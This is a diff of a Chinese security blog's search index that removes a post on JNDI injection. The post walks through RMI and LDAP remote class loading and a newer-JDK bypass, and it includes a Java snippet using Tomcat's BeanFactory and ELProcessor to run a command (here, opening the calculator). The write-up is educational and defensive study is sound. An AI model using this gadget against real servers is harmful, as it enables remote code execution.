-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>SSRF</tag>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2017-10271 WebLogic</title>
     <url>/2026/06/30/weblogic2/</url>
     <content><![CDATA[<blockquote>
@@ -1813,137 +2029,6 @@
 <p><img src="/2026/06/30/weblogic2/weblogic7.png"></p>
 <p>到这里就反序列化了。</p>
 <p>参考文章:<a href="https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/">https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/</a></p>
-]]></content>
-      <categories>
-        <category>Java安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>JNDI</title>
-    <url>/2026/06/14/jndi/</url>
-    <content><![CDATA[<p><em><strong>概念</strong></em></p>
-<p>JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。</p>
-<span id="more"></span>
-
-<p><em><strong>命名服务</strong></em></p>
-<p>命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。</p>
-<p>在命名服务中，有几个重要的概念。</p>
-<ul>
-<li><strong>Bindings</strong>：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。</li>
-<li><strong>Context</strong>：上下文，一个上下文中对应着<strong>一组名称到对象的绑定关系</strong>，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。</li>
-<li><strong>References</strong>：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C&#x2F;C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
-</ul>
-<p><em><strong>目录服务</strong></em></p>
-<p>简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。</p>
-<p>一些常见的目录服务有：</p>
-<ul>
-<li>LDAP： 轻型目录访问协议</li>
-<li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li>
-<li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li>
-</ul>
-<p>JDK 中包含了下述内置的命名目录服务:</p>
-<ul>
-<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
-<li>LDAP: 轻量级目录访问协议</li>
-<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
-<li>DNS（域名转换协议）</li>
-</ul>
-<p>可以这样理解，用jndi进行的操作相当于在相对应的命名服务或者是目录服务上进行操作，这个jndi就是统一了对于各种命名服务或目录服务的操作。</p>
-<p><em><strong>JNDI+RMI</strong></em></p>
-<blockquote>
-<p>&lt;jdk8u121</p>
-</blockquote>
-<p>一路跟进lookup看一下</p>
-<p><img src="/2026/06/14/jndi/jndi1.png" alt="截图"></p>
-<p><img src="/2026/06/14/jndi/jndi2.png" alt="截图"></p>
-<p><img src="/2026/06/14/jndi/jndi3.png" alt="截图"></p>
-<p><img src="/2026/06/14/jndi/jndi4.png" alt="截图"></p>
-<p>最后可以看到他调用的是RegistryImpl_Stub的lookup方法，也就是说他跟rmi是没有区别的，rmi的所有漏洞他都可以用上。</p>
-<p>下面看一下jndi的利用方法。</p>
-<p><img src="/2026/06/14/jndi/jndi5.png" alt="截图"></p>
-<p>这个操作就是让remoteObj这个名字对应refObj。</p>
-<p>Reference的三个参数是，类名，工厂名，工厂地址，这个类名就是我们实际要加载的类。</p>
-<p>下面我们看一下rebind方法</p>
-<p><img src="/2026/06/14/jndi/jndi6.png" alt="截图"></p>
-<p>obj被encode了，看一下encodeObject()</p>
-<p><img src="/2026/06/14/jndi/jndi7.png" alt="截图"></p>
-<p>obj是reference就包装成ReferenceWrapper()</p>
-<p>下面看一下lookup的过程</p>
-<p><img src="/2026/06/14/jndi/jndi8.png" alt="截图"></p>
-<p>接收的obj是ReferenceWrapper所以要decode</p>
-<p><img src="/2026/06/14/jndi/jndi9.png" alt="截图"></p>
-<p>跟进</p>
-<p><img src="/2026/06/14/jndi/jndi10.png" alt="截图"></p>
-<p>跟进</p>
-<p><img src="/2026/06/14/jndi/jndi15.png" alt="截图"></p>
-<p>跟进loadClass</p>
-<p><img src="/2026/06/14/jndi/jndi11.png" alt="截图"></p>
-<p>用className找一下肯定是找不到的</p>
-<p><img src="/2026/06/14/jndi/jndi12.png" alt="截图"></p>
-<p>然后用codebase加载，codebase就是reference里面写的那个地址，跟进loadClass()</p>
-<p><img src="/2026/06/14/jndi/jndi13.png" alt="截图"></p>
-<p>用了URLClassLoader()，他可以出网加载类。跟进</p>
-<p><img src="/2026/06/14/jndi/jndi14.png" alt="截图"></p>
-<p>这次就可以加载了，而且这个forName的参数里有true也就是说是会初始化的。这样我们就可以执行我们的恶意代码了。</p>
-<p>而且也可以知道类的初始化不是在RegistryContext执行的，也就是说其他的协议也可以利用这个漏洞。</p>
-<p><em><strong>JNDI+LDAP</strong></em></p>
-<blockquote>
-<p>&lt;jdk8u191</p>
-</blockquote>
-<p>起一个LDAP服务，跟之前RMI一样用Reference帮一下就好了，然后看一下lookup的过程</p>
-<p><img src="/2026/06/14/jndi/jndi22.png" alt="截图"></p>
-<p>一直跟进lookup就好了</p>
-<p><img src="/2026/06/14/jndi/jndi16.png" alt="截图"></p>
-<p>会走到LdapCtx</p>
-<p><img src="/2026/06/14/jndi/jndi17.png" alt="截图"></p>
-<p>在这个方法里面会走到这里decodeObject跟进</p>
-<p><img src="/2026/06/14/jndi/jndi18.png" alt="截图"></p>
-<p>这一长串的if判断是在根据获得的atters进行操作，如果说序列化数据就反序列化，如果是远程对像就decode远程对象，如果是Reference就decodeReference。</p>
-<p><img src="/2026/06/14/jndi/jndi19.png" alt="截图"></p>
-<p>解析玩reference以后走到这里，跟进</p>
-<p><img src="/2026/06/14/jndi/jndi20.png" alt="截图"></p>
-<p>跟进</p>
-<p><img src="/2026/06/14/jndi/jndi21.png" alt="截图"></p>
-<p>用名字在本地找一下，找不到，然后用codebase，总之跟RMI一模一样。</p>
-<p><em><strong>高版本绕过</strong></em></p>
-<blockquote>
-<p>&gt;jdk8u191 下面这个绕过方法需要tomcat8且 &lt;8.5.79</p>
-</blockquote>
-<p>在高版本下是不支持远程加载类的，可以看一下代码。</p>
-<p><img src="/2026/06/14/jndi/jndi23.png" alt="截图"></p>
-<p>可以看到，跟之前比起来多了个判断，这个trustURLCodebase默认是false，所以这个if判断会走到else，也就是说没有加载类。</p>
-<p>远程加载不行了，所以就想了个本地加载的方法。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;)&quot;</span>));</span><br><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, ref);</span><br></pre></td></tr></table></figure>
-
-<p>总的来说就是factory用的是BeanFactory，然后用el表达式来调用恶意代码。</p>
-<p>先来了解一下ResourceRef是什么</p>
-<p>ResourceRef时Reference的子类，也就是他两是继承关系。</p>
-<p><img src="/2026/06/14/jndi/jndi28.png" alt="截图"></p>
-<p>出了在创建Reference用到的参数以外，其余的参数放进了StringRefaddr以后add了。我们看一下Reference类</p>
-<p><img src="/2026/06/14/jndi/jndi29.png" alt="截图"></p>
-<p>这个类有四个成员变量，有三个我们已经很熟悉了，这个addrs是这次第一次用的，add存储到的地方就是这里。他这里存储的就是工厂会用到的其余的参数，这些参数是以键值对的形式存在的。这样就大概了解这个恶意代码的意思了。</p>
-<p>看一下流程</p>
-<p><img src="/2026/06/14/jndi/jndi24.png" alt="截图"></p>
-<p>前面都一样，进入这个方法开始不一样了，可以看到本地加载成功了。</p>
-<p><img src="/2026/06/14/jndi/jndi25.png" alt="截图"></p>
-<p>之前是在远程加载factory的时候调用了恶意代码，不走到这里就结束利用了，而这次不一样，会调用到工厂的getObjectInstance方法，这个方法就是根据reference提供的参数实例化一个类。我们跟进去看一下。</p>
-<p><img src="/2026/06/14/jndi/jndi26.png" alt="截图"></p>
-<p>一上来就是一个if判断，这个判断得满足<code>obj instanceof ResourceRef</code>所以用的是这个类。</p>
-<p>下面具体分析一下这个方法的逻辑。</p>
-<p>加载Reference提供的要加载的类，在我们的代码中就是<code>ELProcessor</code></p>
-<p><img src="/2026/06/14/jndi/jndi27.png" alt="截图"></p>
-<p>可以看到后续还把这个类给实例化了，然后拿键为forceString键值对，如果这个值里有&#x3D;的话,setterName就是等号后面的部分，在我们这个代码中就是eval了。正常情况应该是某个set方法。</p>
-<p><img src="/2026/06/14/jndi/jndi30.png" alt="截图"></p>
-<p>将这个等号的前面部分和反射获取的方法存到forced。</p>
-<p><img src="/2026/06/14/jndi/jndi31.png" alt="截图"></p>
-<p>遍历reference存着的键值对，这个键值对的建不能是if判断里面的这几个，所以我们的恶意代码中只有键为x的部分会通过，value就是这个键值对的值部分。从force中拿出方法，然后invoke调用了。</p>
-<p>后面就是el表达式的解析以及调用了。</p>
-<p>总结一下</p>
-<p>这个BeanFactory，会把reference指定类给加载并实例化，反射获取指定类的，键值对中键为forceString，值里面有&#x3D;的&#x3D;后面部分写的方法。这个方法的参数从键跟&#x3D;的前面部分一样的键值对的值部分获取，最后调用。</p>
-<p>选择BeanFactory是因为他有动态性，会反射调用。</p>
-<p>选择el表达式是因为这个表达式的参数只需提供字符串。</p>
-<p>推荐视频:<a href="https://www.bilibili.com/video/BV1P54y1Z7Lf/?spm_id_from=333.1387.upload.video_card.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1P54y1Z7Lf/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-<p>参考文章:<a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p>
 ]]></content>
       <categories>
         <category>Java安全</category>
